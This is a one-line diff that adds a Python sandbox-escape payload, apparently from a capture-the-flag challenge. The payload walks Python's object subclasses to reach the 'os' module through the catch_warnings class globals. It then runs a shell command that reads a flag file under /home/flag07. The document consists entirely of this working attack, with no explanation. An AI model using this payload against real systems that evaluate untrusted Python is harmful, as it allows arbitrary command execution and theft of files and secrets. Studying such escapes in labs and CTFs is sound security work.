@@ -1,0 +1,1 @@
+[c.__init__.__globals__['sys'].modules['os'].system('cat /home/flag07/.flag') for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings']
